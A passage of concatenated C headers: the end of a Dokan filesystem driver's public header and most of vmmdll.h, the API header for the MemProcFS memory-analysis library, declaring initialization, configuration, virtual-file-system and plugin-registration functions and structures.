// * Since Win10, NTFS can have specific directories
//   case-sensitive / insensitive, even if the device tags says otherwise.
// Dokan choose to support case-sensitive or case-insensitive filesystem
// but not those NTFS specific scenarios.
#define DOKAN_EVENT_CASE_SENSITIVE                                  (1 << 6)
// Enables unmounting of network drives via file explorer
#define DOKAN_EVENT_ENABLE_NETWORK_UNMOUNT                          (1 << 7)
#define DOKAN_EVENT_DISPATCH_DRIVER_LOGS                            (1 << 8)
#define DOKAN_EVENT_ALLOW_IPC_BATCHING                              (1 << 9)
#define DOKAN_EVENT_DRIVE_LETTER_IN_USE                             (1 << 10)

// Non-exclusive bits that can be set in EVENT_DRIVER_INFO.Flags for the driver
// to send back extra info about what happened during a mount attempt, whether
// or not it succeeded.

// The volume arrival notification did not trigger mounting as expected, so an
// explicit request was made to the mount manager.
#define DOKAN_DRIVER_INFO_MOUNT_FORCED 1

// Dokan did not specify a preferred drive letter in response to the suggested
// link name query from the mount manager. This happens if we know the preferred
// drive letter is in use, and want the mount manager to select one.
#define DOKAN_DRIVER_INFO_AUTO_ASSIGN_REQUESTED 2

// Dokan unmounted and then reused the preferred drive letter, because it was
// determined to be another dokan drive owned by the same Windows user.
#define DOKAN_DRIVER_INFO_OLD_DRIVE_UNMOUNTED 4

// Dokan determined that the preferred drive letter was in use by a dokan drive
// owned by a different Windows user. If this is set, then
// DOKAN_DRIVER_INFO_AUTO_ASSIGNED is also set.
#define DOKAN_DRIVER_INFO_OLD_DRIVE_LEFT_MOUNTED 8

// The dokan driver is returning a mount response to the DLL before the mount
// manager has actually assigned a drive letter. We are not sure if this ever
// happens; if so, it should be very rare.
#define DOKAN_DRIVER_INFO_NO_MOUNT_POINT_ASSIGNED 16

// Dokan failed to set the reparse point for the mount point folder provided.
#define DOKAN_DRIVER_INFO_SET_REPARSE_POINT_FAILED 32

typedef struct _EVENT_DRIVER_INFO {
  ULONG DriverVersion;
  ULONG Status;
  ULONG Flags;
  ULONG DeviceNumber;
  ULONG MountId;
  WCHAR DeviceName[64];
  WCHAR ActualDriveLetter;
} EVENT_DRIVER_INFO, *PEVENT_DRIVER_INFO;

typedef struct _EVENT_START {
  ULONG UserVersion;
  ULONG DeviceType;
  ULONG Flags;
  WCHAR MountPoint[260];
  WCHAR UNCName[64];
  ULONG IrpTimeout;
  ULONG FcbGarbageCollectionIntervalMs;
  ULONG VolumeSecurityDescriptorLength;
  CHAR VolumeSecurityDescriptor[VOLUME_SECURITY_DESCRIPTOR_MAX_SIZE];
} EVENT_START, *PEVENT_START;

#ifdef _MSC_VER
#pragma warning(push)
#pragma warning(disable : 4201)
#endif
typedef struct _DOKAN_RENAME_INFORMATION {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;  // FileRenameInformation
		ULONG Flags;              // FileRenameInformationEx
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
  ULONG FileNameLength;
  WCHAR FileName[1];
} DOKAN_RENAME_INFORMATION, *PDOKAN_RENAME_INFORMATION;
#ifdef _MSC_VER
#pragma warning(pop)
#endif

typedef struct _DOKAN_LINK_INFORMATION {
  BOOLEAN ReplaceIfExists;
  ULONG FileNameLength;
  WCHAR FileName[1];
} DOKAN_LINK_INFORMATION, *PDOKAN_LINK_INFORMATION;

/**
* \struct DOKAN_MOUNT_POINT_INFO
* \brief Dokan Mount point information
*/
typedef struct _DOKAN_MOUNT_POINT_INFO {
  /** File System Type */
  ULONG Type;
  /** Mount point. Can be "M:\" (drive letter) or "C:\mount\dokan" (path in NTFS) */
  WCHAR MountPoint[MAX_PATH];
  /** UNC name used for network volume */
  WCHAR UNCName[64];
  /** Disk Device Name */
  WCHAR DeviceName[64];
  /** Session ID of calling process */
  ULONG SessionId;
  /** Contains information about the flags on the mount */
  ULONG MountOptions;
} DOKAN_MOUNT_POINT_INFO, *PDOKAN_MOUNT_POINT_INFO;

// Dokan Major IRP values dispatched to userland for custom request with
// EVENT_CONTEXT.
#define DOKAN_IRP_LOG_MESSAGE 0x20

// Driver log message disptached during DOKAN_IRP_LOG_MESSAGE event.
typedef struct _DOKAN_LOG_MESSAGE {
  ULONG MessageLength;
  CHAR Message[1];
} DOKAN_LOG_MESSAGE, *PDOKAN_LOG_MESSAGE;

#endif // PUBLIC_H_

```

`includes/vmmdll.h`:

```h
// vmmdll.h : header file to include in projects that use vmm.dll / vmm.so
// 
// Windows may access both UTF-8 *U and Wide-Char *W versions of functions
// while Linux may only access UTF-8 versions. Some functionality may also
// be degraded or unavailable on Linux.
//
// (c) Ulf Frisk, 2018-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
// Header Version: 4.7.2
//

#include "leechcore.h"

#ifndef __VMMDLL_H__
#define __VMMDLL_H__
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */

#ifdef _WIN32

#include <Windows.h>
#undef EXPORTED_FUNCTION
#define EXPORTED_FUNCTION
typedef unsigned __int64                    QWORD, *PQWORD;

#endif /* _WIN32 */
#ifdef LINUX

#include <inttypes.h>
#include <stdarg.h>
#include <stdlib.h>
#undef EXPORTED_FUNCTION
#define EXPORTED_FUNCTION                   __attribute__((visibility("default")))
typedef void                                VOID, *PVOID, *HANDLE, **PHANDLE, *HMODULE;
typedef long long unsigned int              QWORD, *PQWORD, ULONG64, *PULONG64;
typedef size_t                              SIZE_T, *PSIZE_T;
typedef uint64_t                            FILETIME, *PFILETIME;
typedef uint32_t                            DWORD, *PDWORD, *LPDWORD, BOOL, *PBOOL, NTSTATUS;
typedef uint16_t                            WORD, *PWORD;
typedef uint8_t                             BYTE, *PBYTE, *LPBYTE, UCHAR;
typedef char                                CHAR, *PCHAR, *LPSTR, *LPCSTR;
typedef uint16_t                            WCHAR, *PWCHAR, *LPWSTR, *LPCWSTR;
#define MAX_PATH                            260
#define _In_
#define _In_z_
#define _In_opt_
#define _In_reads_(x)
#define _In_reads_opt_(x)
#define _Inout_
#define _Inout_bytecount_(x)
#define _Inout_opt_
#define _Inout_updates_opt_(x)
#define _Out_
#define _Out_opt_
#define _Out_writes_(x)
#define _Out_writes_bytes_opt_(x)
#define _Out_writes_opt_(x)
#define _Out_writes_to_(x,y)
#define _When_(x,y)
#define _Frees_ptr_opt_
#define _Post_ptr_invalid_
#define _Check_return_opt_
#define _Printf_format_string_
#define _Success_(x)

#endif /* LINUX */



//-----------------------------------------------------------------------------
// INITIALIZATION FUNCTIONALITY BELOW:
// Choose one way of initializing the VMM / MemProcFS.
//-----------------------------------------------------------------------------

/*
* Initialize VMM.DLL with command line parameters. For a more detailed info
* about the parameters please see github wiki for MemProcFS and LeechCore.
* NB! LeechCore initialization parameters are _also_ valid to this function.
* Important parameters are:
*    -printf = show printf style outputs.
*    -v -vv -vvv = extra verbosity levels.
*    -device = device as on format for LeechCore - please see leechcore.h or
*              Github documentation for additional information. Some values
*              are: <file>, fpga, usb3380, hvsavedstate, totalmeltdown, pmem
*    -remote = remote LeechCore instance - please see leechcore.h or Github
*              documentation for additional information.
*    -norefresh = disable background refreshes (even if backing memory is
*              volatile memory).
*    -memmap = specify a physical memory map given by file or specify 'auto'.
*              example: -memmap c:\\temp\\my_custom_memory_map.txt
*              example: -memmap auto
*    -pagefile[0-9] = page file(s) to use in addition to physical memory.
*              Normally pagefile.sys have index 0 and swapfile.sys index 1.
*              Page files are in constant flux - do not use if time diff
*              between memory dump and page files are more than few minutes.
*              Example: 'pagefile0 swapfile.sys'
*    -symbolserverdisable = disable symbol server until user change.
*              This parameter will take precedence over registry settings.
*    -waitinitialize = Wait for initialization to complete before returning.
*              Normal use is that some initialization is done asynchronously
*              and may not be completed when initialization call is completed.
*              This includes virtual memory compression, registry and more.
*              Example: '-waitinitialize'
*    -userinteract = allow vmm.dll to, on the console, query the user for
*              information such as, but not limited to, leechcore device options.
*              Default: user interaction = disabled.
*    -forensic = start a forensic scan of the physical memory immediately after
*              startup if possible. Allowed parameter values range from 0-4.
*              Note! forensic mode is not available for live memory.
*              1 = forensic mode with in-memory sqlite database.
*              2 = forensic mode with temp sqlite database deleted upon exit.
*              3 = forensic mode with temp sqlite database remaining upon exit.
*              4 = forensic mode with static named sqlite database (vmm.sqlite3).
*              Example -forensic 4
*
* -- argc
* -- argv
* -- ppLcErrorInfo = optional pointer to receive a function allocated memory of
*              struct LC_CONFIG_ERRORINFO with extended error information upon
*              failure. Any memory received should be free'd by caller by
*              calling LcMemFree().
* -- return = success/fail
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Initialize(_In_ DWORD argc, _In_ LPSTR argv[]);

EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_InitializeEx(_In_ DWORD argc, _In_ LPSTR argv[], _Out_opt_ PPLC_CONFIG_ERRORINFO ppLcErrorInfo);

/*
* Close an initialized instance of VMM.DLL and clean up all allocated resources
* including plugins, linked PCILeech.DLL and other memory resources.
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_Close();

/*
* Free memory allocated by the VMMDLL.
* -- pvMem
*/
EXPORTED_FUNCTION
VOID VMMDLL_MemFree(_Frees_ptr_opt_ PVOID pvMem);



//-----------------------------------------------------------------------------
// CONFIGURATION SETTINGS BELOW:
// Configure MemProcFS or the underlying memory
// acquisition devices.
//-----------------------------------------------------------------------------

/*
* Options used together with the functions: VMMDLL_ConfigGet & VMMDLL_ConfigSet
* Options are defined with either: VMMDLL_OPT_* in this header file or as
* LC_OPT_* in leechcore.h
* For more detailed information check the sources for individual device types.
*/
#define VMMDLL_OPT_CORE_PRINTF_ENABLE                   0x4000000100000000  // RW
#define VMMDLL_OPT_CORE_VERBOSE                         0x4000000200000000  // RW
#define VMMDLL_OPT_CORE_VERBOSE_EXTRA                   0x4000000300000000  // RW
#define VMMDLL_OPT_CORE_VERBOSE_EXTRA_TLP               0x4000000400000000  // RW
#define VMMDLL_OPT_CORE_MAX_NATIVE_ADDRESS              0x4000000800000000  // R

#define VMMDLL_OPT_CORE_SYSTEM                          0x2000000100000000  // R
#define VMMDLL_OPT_CORE_MEMORYMODEL                     0x2000000200000000  // R

#define VMMDLL_OPT_CONFIG_IS_REFRESH_ENABLED            0x2000000300000000  // R - 1/0
#define VMMDLL_OPT_CONFIG_TICK_PERIOD                   0x2000000400000000  // RW - base tick period in ms
#define VMMDLL_OPT_CONFIG_READCACHE_TICKS               0x2000000500000000  // RW - memory cache validity period (in ticks)
#define VMMDLL_OPT_CONFIG_TLBCACHE_TICKS                0x2000000600000000  // RW - page table (tlb) cache validity period (in ticks)
#define VMMDLL_OPT_CONFIG_PROCCACHE_TICKS_PARTIAL       0x2000000700000000  // RW - process refresh (partial) period (in ticks)
#define VMMDLL_OPT_CONFIG_PROCCACHE_TICKS_TOTAL         0x2000000800000000  // RW - process refresh (full) period (in ticks)
#define VMMDLL_OPT_CONFIG_VMM_VERSION_MAJOR             0x2000000900000000  // R
#define VMMDLL_OPT_CONFIG_VMM_VERSION_MINOR             0x2000000A00000000  // R
#define VMMDLL_OPT_CONFIG_VMM_VERSION_REVISION          0x2000000B00000000  // R
#define VMMDLL_OPT_CONFIG_STATISTICS_FUNCTIONCALL       0x2000000C00000000  // RW - enable function call statistics (.status/statistics_fncall file)
#define VMMDLL_OPT_CONFIG_IS_PAGING_ENABLED             0x2000000D00000000  // RW - 1/0

#define VMMDLL_OPT_WIN_VERSION_MAJOR                    0x2000010100000000  // R
#define VMMDLL_OPT_WIN_VERSION_MINOR                    0x2000010200000000  // R
#define VMMDLL_OPT_WIN_VERSION_BUILD                    0x2000010300000000  // R
#define VMMDLL_OPT_WIN_SYSTEM_UNIQUE_ID                 0x2000010400000000  // R

#define VMMDLL_OPT_FORENSIC_MODE                        0x2000020100000000  // RW - enable/retrieve forensic mode type [0-4].

#define VMMDLL_OPT_REFRESH_ALL                          0x2001ffff00000000  // W - refresh all caches
#define VMMDLL_OPT_REFRESH_FREQ_MEM                     0x2001000200000000  // W - refresh memory cache (excl. TLB) [partial 33%/call]
#define VMMDLL_OPT_REFRESH_FREQ_TLB                     0x2001000400000000  // W - refresh page table (TLB) cache [partial 33%/call]
#define VMMDLL_OPT_REFRESH_FREQ_FAST                    0x2001040000000000  // W - refresh fast frequency - incl. partial process refresh
#define VMMDLL_OPT_REFRESH_FREQ_MEDIUM                  0x2001000100000000  // W - refresh medium frequency - incl. full process refresh
#define VMMDLL_OPT_REFRESH_FREQ_SLOW                    0x2001001000000000  // W - refresh slow frequency.
#define VMMDLL_OPT_REFRESH_PROCESS                      0x2001000100000000  // W - DEPRECATED: refresh process listings
#define VMMDLL_OPT_REFRESH_READ                         0x2001000200000000  // W - DEPRECATED: refresh physical read cache
#define VMMDLL_OPT_REFRESH_TLB                          0x2001000400000000  // W - DEPRECATED: refresh page table (TLB) cache
#define VMMDLL_OPT_REFRESH_PAGING                       0x2001000800000000  // W - DEPRECATED: refresh virtual memory 'paging' cache
#define VMMDLL_OPT_REFRESH_REGISTRY                     0x2001001000000000  // W - DEPRECATED:
#define VMMDLL_OPT_REFRESH_USER                         0x2001002000000000  // W - DEPRECATED:
#define VMMDLL_OPT_REFRESH_PHYSMEMMAP                   0x2001004000000000  // W - DEPRECATED:
#define VMMDLL_OPT_REFRESH_PFN                          0x2001008000000000  // W - DEPRECATED:
#define VMMDLL_OPT_REFRESH_OBJ                          0x2001010000000000  // W - DEPRECATED:
#define VMMDLL_OPT_REFRESH_NET                          0x2001020000000000  // W - DEPRECATED:

static LPCSTR VMMDLL_MEMORYMODEL_TOSTRING[4] = { "N/A", "X86", "X86PAE", "X64" };

typedef enum tdVMMDLL_MEMORYMODEL_TP {
    VMMDLL_MEMORYMODEL_NA       = 0,
    VMMDLL_MEMORYMODEL_X86      = 1,
    VMMDLL_MEMORYMODEL_X86PAE   = 2,
    VMMDLL_MEMORYMODEL_X64      = 3
} VMMDLL_MEMORYMODEL_TP;

typedef enum tdVMMDLL_SYSTEM_TP {
    VMMDLL_SYSTEM_UNKNOWN_X64   = 1,
    VMMDLL_SYSTEM_WINDOWS_X64   = 2,
    VMMDLL_SYSTEM_UNKNOWN_X86   = 3,
    VMMDLL_SYSTEM_WINDOWS_X86   = 4
} VMMDLL_SYSTEM_TP;

/*
* Set a device specific option value. Please see defines VMMDLL_OPT_* for infor-
* mation about valid option values. Please note that option values may overlap
* between different device types with different meanings.
* -- fOption
* -- pqwValue = pointer to ULONG64 to receive option value.
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_ConfigGet(_In_ ULONG64 fOption, _Out_ PULONG64 pqwValue);

/*
* Set a device specific option value. Please see defines VMMDLL_OPT_* for infor-
* mation about valid option values. Please note that option values may overlap
* between different device types with different meanings.
* -- fOption
* -- qwValue
* -- return = success/fail.
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_ConfigSet(_In_ ULONG64 fOption, _In_ ULONG64 qwValue);



//-----------------------------------------------------------------------------
// FORWARD DECLARATIONS:
//-----------------------------------------------------------------------------

typedef struct tdVMMDLL_MAP_PFN *PVMMDLL_MAP_PFN;



//-----------------------------------------------------------------------------
// LINUX SPECIFIC DEFINES:
//-----------------------------------------------------------------------------
#ifdef LINUX

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        DWORD   PhysicalAddress;
        DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef struct _SERVICE_STATUS {
    DWORD   dwServiceType;
    DWORD   dwCurrentState;
    DWORD   dwControlsAccepted;
    DWORD   dwWin32ExitCode;
    DWORD   dwServiceSpecificExitCode;
    DWORD   dwCheckPoint;
    DWORD   dwWaitHint;
} SERVICE_STATUS, *LPSERVICE_STATUS;
#endif /* LINUX */



//-----------------------------------------------------------------------------
// VFS - VIRTUAL FILE SYSTEM FUNCTIONALITY BELOW:
// NB! VFS FUNCTIONALITY REQUIRES PLUGINS TO BE INITIALIZED
//     WITH CALL TO VMMDLL_InitializePlugins().
// This is the core of MemProcFS. All implementation and analysis towards
// the virtual file system (vfs) is possible by using functionality below. 
//-----------------------------------------------------------------------------

#define VMMDLL_STATUS_SUCCESS                       ((NTSTATUS)0x00000000L)
#define VMMDLL_STATUS_UNSUCCESSFUL                  ((NTSTATUS)0xC0000001L)
#define VMMDLL_STATUS_END_OF_FILE                   ((NTSTATUS)0xC0000011L)
#define VMMDLL_STATUS_FILE_INVALID                  ((NTSTATUS)0xC0000098L)
#define VMMDLL_STATUS_FILE_SYSTEM_LIMITATION        ((NTSTATUS)0xC0000427L)

#define VMMDLL_VFS_FILELIST_EXINFO_VERSION          1
#define VMMDLL_VFS_FILELIST_VERSION                 2
#define VMMDLL_VFS_FILELISTBLOB_VERSION             0xf88f0001

typedef struct tdVMMDLL_VFS_FILELIST_EXINFO {
    DWORD dwVersion;
    BOOL fCompressed;                   // set flag FILE_ATTRIBUTE_COMPRESSED - (no meaning but shows gui artifact in explorer.exe)
    union {
        FILETIME ftCreationTime;        // 0 = default time
        QWORD qwCreationTime;
    };
    union {
        FILETIME ftLastAccessTime;      // 0 = default time
        QWORD qwLastAccessTime;
    };
    union {
        FILETIME ftLastWriteTime;       // 0 = default time
        QWORD qwLastWriteTime;
    };
} VMMDLL_VFS_FILELIST_EXINFO, *PVMMDLL_VFS_FILELIST_EXINFO;

typedef struct tdVMMDLL_VFS_FILELIST2 {
    DWORD dwVersion;
    VOID(*pfnAddFile)     (_Inout_ HANDLE h, _In_ LPSTR uszName, _In_ ULONG64 cb, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
    VOID(*pfnAddDirectory)(_Inout_ HANDLE h, _In_ LPSTR uszName, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
    HANDLE h;
} VMMDLL_VFS_FILELIST2, *PVMMDLL_VFS_FILELIST2;

typedef struct tdVMMDLL_VFS_FILELISTBLOB_ENTRY {
    ULONG64 ouszName;                       // byte offset to string from VMMDLL_VFS_FILELISTBLOB.uszMultiText
    ULONG64 cbFileSize;                     // -1 == directory
    VMMDLL_VFS_FILELIST_EXINFO ExInfo;      // optional ExInfo
} VMMDLL_VFS_FILELISTBLOB_ENTRY, *PVMMDLL_VFS_FILELISTBLOB_ENTRY;

typedef struct tdVMMDLL_VFS_FILELISTBLOB {
    DWORD dwVersion;                        // VMMDLL_VFS_FILELISTBLOB_VERSION
    DWORD cbStruct;
    DWORD cFileEntry;
    DWORD cbMultiText;
    union {
        LPSTR uszMultiText;
        QWORD _Reserved;
    };
    DWORD _FutureUse[8];
    VMMDLL_VFS_FILELISTBLOB_ENTRY FileEntry[0];
} VMMDLL_VFS_FILELISTBLOB, *PVMMDLL_VFS_FILELISTBLOB;

/*
* Helper functions for callbacks into the VMM_VFS_FILELIST2 structure.
*/
EXPORTED_FUNCTION
VOID VMMDLL_VfsList_AddFile(_In_ HANDLE pFileList, _In_ LPSTR uszName, _In_ ULONG64 cb, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
VOID VMMDLL_VfsList_AddFileW(_In_ HANDLE pFileList, _In_ LPWSTR wszName, _In_ ULONG64 cb, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
EXPORTED_FUNCTION
VOID VMMDLL_VfsList_AddDirectory(_In_ HANDLE pFileList, _In_ LPSTR uszName, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
VOID VMMDLL_VfsList_AddDirectoryW(_In_ HANDLE pFileList, _In_ LPWSTR wszName, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo);
EXPORTED_FUNCTION BOOL VMMDLL_VfsList_IsHandleValid(_In_ HANDLE pFileList);

/*
* List a directory of files in MemProcFS. Directories and files will be listed
* by callbacks into functions supplied in the pFileList parameter.
* If information of an individual file is needed it's neccessary to list all
* files in its directory.
* -- [uw]szPath
* -- pFileList
* -- return
*/
EXPORTED_FUNCTION
_Success_(return) BOOL VMMDLL_VfsListU(_In_ LPSTR  uszPath, _Inout_ PVMMDLL_VFS_FILELIST2 pFileList);
_Success_(return) BOOL VMMDLL_VfsListW(_In_ LPWSTR wszPath, _Inout_ PVMMDLL_VFS_FILELIST2 pFileList);

/*
* List a directory of files in MemProcFS and return a VMMDLL_VFS_FILELISTBLOB.
* CALLER FREE: VMMDLL_MemFree(return)
* -- uszPath
* -- return
*/
EXPORTED_FUNCTION
_Success_(return != NULL) PVMMDLL_VFS_FILELISTBLOB VMMDLL_VfsListBlobU(_In_ LPSTR uszPath);

/*
* Read select parts of a file in MemProcFS.
* -- [uw]szFileName
* -- pb
* -- cb
* -- pcbRead
* -- cbOffset
* -- return
*
*/
EXPORTED_FUNCTION
NTSTATUS VMMDLL_VfsReadU(_In_ LPSTR  uszFileName, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset);
NTSTATUS VMMDLL_VfsReadW(_In_ LPWSTR wszFileName, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset);

/*
* Write select parts to a file in MemProcFS.
* -- [uw]szFileName
* -- pb
* -- cb
* -- pcbWrite
* -- cbOffset
* -- return
*/
EXPORTED_FUNCTION
NTSTATUS VMMDLL_VfsWriteU(_In_ LPSTR  uszFileName, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset);
NTSTATUS VMMDLL_VfsWriteW(_In_ LPWSTR wszFileName, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset);

/*
* Utility functions for MemProcFS read/write towards different underlying data
* representations.
*/
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsReadFile_FromPBYTE(_In_ PBYTE pbFile, _In_ ULONG64 cbFile, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset);
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsReadFile_FromQWORD(_In_ ULONG64 qwValue, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset, _In_ BOOL fPrefix);
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsReadFile_FromDWORD(_In_ DWORD dwValue, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset, _In_ BOOL fPrefix);
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsReadFile_FromBOOL(_In_ BOOL fValue, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead, _In_ ULONG64 cbOffset);
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsWriteFile_BOOL(_Inout_ PBOOL pfTarget, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset);
EXPORTED_FUNCTION NTSTATUS VMMDLL_UtilVfsWriteFile_DWORD(_Inout_ PDWORD pdwTarget, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset, _In_ DWORD dwMinAllow);



//-----------------------------------------------------------------------------
// PLUGIN MANAGER FUNCTIONALITY BELOW:
// Function and structures to initialize and use MemProcFS plugin functionality.
// The plugin manager is started by a call to function:
// VMM_VfsInitializePlugins. Each built-in plugin and external plugin of which
// the DLL name matches m_*.dll will receive a call to its InitializeVmmPlugin
// function. The plugin/module may decide to call pfnPluginManager_Register to
// register plugins in the form of different names one or more times.
// Example of registration function in a plugin DLL below: 
// 'VOID InitializeVmmPlugin(_In_ PVMM_PLUGIN_REGINFO pRegInfo)'
//-----------------------------------------------------------------------------

/*
* Initialize all potential plugins, both built-in and external, that maps into
* MemProcFS. Please note that plugins are not loaded by default - they have to
* be explicitly loaded by calling this function. They will be unloaded on a
* general close of the vmm dll.
* -- return
*/
EXPORTED_FUNCTION _Success_(return)
BOOL VMMDLL_InitializePlugins();

#define VMMDLL_PLUGIN_CONTEXT_MAGIC                 0xc0ffee663df9301c
#define VMMDLL_PLUGIN_CONTEXT_VERSION               5
#define VMMDLL_PLUGIN_REGINFO_MAGIC                 0xc0ffee663df9301d
#define VMMDLL_PLUGIN_REGINFO_VERSION               13
#define VMMDLL_PLUGIN_FORENSIC_JSONDATA_VERSION     0xc0ee0001

#define VMMDLL_PLUGIN_NOTIFY_VERBOSITYCHANGE        0x01
#define VMMDLL_PLUGIN_NOTIFY_REFRESH_FAST           0x05    // refresh fast event   - at partial process refresh.
#define VMMDLL_PLUGIN_NOTIFY_REFRESH_MEDIUM         0x02    // refresh medium event - at full process refresh.
#define VMMDLL_PLUGIN_NOTIFY_REFRESH_SLOW           0x04    // refresh slow event   - at registry refresh.

#define VMMDLL_PLUGIN_NOTIFY_FORENSIC_INIT          0x01000100
#define VMMDLL_PLUGIN_NOTIFY_FORENSIC_INIT_COMPLETE 0x01000200

typedef DWORD                                       VMMDLL_MODULE_ID;
typedef HANDLE                                      *PVMMDLL_PLUGIN_INTERNAL_CONTEXT;

#define VMMDLL_MID_MAIN                             ((VMMDLL_MODULE_ID)0x80000001)
#define VMMDLL_MID_PYTHON                           ((VMMDLL_MODULE_ID)0x80000002)

typedef struct tdVMMDLL_PLUGIN_CONTEXT {
    ULONG64 magic;
    WORD wVersion;
    WORD wSize;
    DWORD dwPID;
    PVOID pProcess;
    LPSTR uszModule;
    LPSTR uszPath;
    PVOID pvReserved1;
    PVMMDLL_PLUGIN_INTERNAL_CONTEXT ctxM;       // optional internal module context.
    VMMDLL_MODULE_ID MID;
} VMMDLL_PLUGIN_CONTEXT, *PVMMDLL_PLUGIN_CONTEXT;

typedef struct tdVMMDLL_PLUGIN_FORENSIC_JSONDATA {
    DWORD dwVersion;        // must equal VMMDLL_PLUGIN_FORENSIC_JSONDATA_VERSION
    BOOL fVerbose;
    LPSTR szjType;          // log type/name (json encoded)
    DWORD i;
    DWORD dwPID;
    QWORD vaObj;
    BOOL fva[2];            // log va even if zero
    QWORD va[2];
    BOOL fNum[2];           // log num even if zero
    QWORD qwNum[2];
    BOOL fHex[2];           // log hex even if zero
    QWORD qwHex[2];
    // str: will be prioritized in order: szu > wsz.
    LPCSTR usz[2];          // str: utf-8 encoded
    LPCWSTR wsz[2];         // str: wide
    BYTE _Reserved[0x4000+256];
} VMMDLL_PLUGIN_FORENSIC_JSONDATA, *PVMMDLL_PLUGIN_FORENSIC_JSONDATA;

typedef struct tdVMMDLL_PLUGIN_FORENSIC_INGEST_PHYSMEM {
    DWORD cMEMs;
    BOOL fValid;
    QWORD paBase;
    PPMEM_SCATTER ppMEMs;
    PVMMDLL_MAP_PFN pPfnMap;
} VMMDLL_PLUGIN_FORENSIC_INGEST_PHYSMEM, *PVMMDLL_PLUGIN_FORENSIC_INGEST_PHYSMEM;

typedef struct tdVMMDLL_PLUGIN_REGINFO {
    ULONG64 magic;
    WORD wVersion;
    WORD wSize;
    VMMDLL_MEMORYMODEL_TP tpMemoryModel;
    VMMDLL_SYSTEM_TP tpSystem;
    HMODULE hDLL;
    BOOL(*pfnPluginManager_Register)(struct tdVMMDLL_PLUGIN_REGINFO *pPluginRegInfo);
    DWORD _Reserved[32];
    // python plugin information - not for general use
    struct {
        BOOL fPythonStandalone;
        DWORD _Reserved;
        HMODULE hReservedDllPython3;
        HMODULE hReservedDllPython3X;
    } python;
    // general plugin registration info to be filled out by the plugin below:
    struct {
        PVMMDLL_PLUGIN_INTERNAL_CONTEXT ctxM;   // optional internal module context [must be cleaned by pfnClose() call].
        CHAR uszPathName[128];
        BOOL fRootModule;
        BOOL fProcessModule;
        BOOL fRootModuleHidden;
        BOOL fProcessModuleHidden;
        CHAR sTimelineNameShort[6];
        CHAR _Reserved[2];
        CHAR uszTimelineFile[32];
        CHAR _Reserved2[32];
    } reg_info;
    // function plugin registration info to be filled out by the plugin below:
    struct {
        BOOL(*pfnList)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP, _Inout_ PHANDLE pFileList);
        NTSTATUS(*pfnRead)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP, _Out_writes_to_(cb, *pcbRead) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbRead,  _In_ ULONG64 cbOffset);
        NTSTATUS(*pfnWrite)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP, _In_reads_(cb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcbWrite, _In_ ULONG64 cbOffset);
        VOID(*pfnNotify)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP, _In_ DWORD fEvent, _In_opt_ PVOID pvEvent, _In_opt_ DWORD cbEvent);
        VOID(*pfnClose)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP);
        BOOL(*pfnVisibleModule)(_In_ PVMMDLL_PLUGIN_CONTEXT ctxP);
        PVOID pvReserved[10];
    } reg_fn;
